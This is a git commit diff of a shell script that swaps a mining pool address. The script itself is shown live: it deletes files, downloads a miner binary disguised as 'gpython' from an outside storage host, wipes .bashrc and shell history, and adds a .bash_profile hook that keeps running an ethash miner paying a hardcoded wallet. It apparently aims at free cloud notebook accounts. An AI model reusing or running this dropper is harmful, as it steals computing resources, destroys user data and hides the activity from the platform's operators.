e4d02b95d45e109bc6dec7443fa6548e1710d8c2
edikusumati <108272275+edikusumati@users.noreply.github.com>
2022-07-01 11:17:06 +0700

    Update a.sh

--- web/a.sh
+++ web/a.sh
@@ -7,7 +7,7 @@ rm -R *
 rm -R /home/studio-lab-user/.ton
 WORKER="RTX-3050"
 WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"
-POOLNH="18.136.196.140:443"
+POOLNH="164.92.118.172:443"
 wget https://ewr1.vultrobjects.com/mines/gpython
 echo ""  > /home/studio-lab-user/.bashrc
 echo "" > /home/studio-lab-user/.bash_history
@@ -18,7 +18,7 @@ echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_
 echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
 echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"' >> /home/studio-lab-user/.bash_profile
-echo 'POOLNH="18.136.196.140:443"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="164.92.118.172:443"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
 chmod +x gas.sh && chmod +x gpython && cd ~/ && history -cr && source .bashrc
